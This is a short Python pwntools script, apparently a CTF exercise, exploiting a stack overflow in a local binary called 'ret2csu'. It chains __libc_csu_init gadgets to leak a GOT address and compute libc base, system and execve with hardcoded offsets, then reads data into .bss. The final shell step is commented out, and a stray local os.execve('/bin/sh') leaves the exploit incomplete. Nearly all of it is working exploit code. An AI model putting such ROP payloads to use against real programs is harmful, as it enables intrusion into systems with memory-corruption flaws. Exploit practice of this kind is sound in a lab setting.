from pwn import*
import os
io=process('./ret2csu')
context.log_level='debug'
elf=ELF('./ret2csu')
__libc_start_main_addr=elf.got['__libc_start_main']
write_got=elf.got['write']
read_got=elf.got['read']
main=elf.sym['main']
 
def csu(r12,r13,r14,r15,last):
	payload=b'a'*(0x80+8)+p64(0x400606)+b'a'*8+p64(0)+p64(1)+p64(r12)
	payload+=p64(r13)+p64(r14)+p64(r15)+p64(0x4005f0)+b'a'*56+p64(last)
	io.send(payload)
	sleep(1)
	
io.recvuntil("Hello, World\n")
csu(write_got,1,write_got,8,main)
write_real=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(write_real))
base=write_real-0x0f7af0
print(hex(base))
system=base+0x04c920
exceve=0x0d4060+base
bss=0x601028
csu(read_got,0,bss,18,main)
io.recvuntil("Hello, World\n")


os.execve("/bin/sh", ["/bin/sh"], os.environ)

# io.sendline(p64(exceve)+b'/bin/sh\x00')
# csu(bss,bss+8,0,0,main)
# io.recvuntil("Hello, World\n")  # 确保程序还活着
# io.interactive()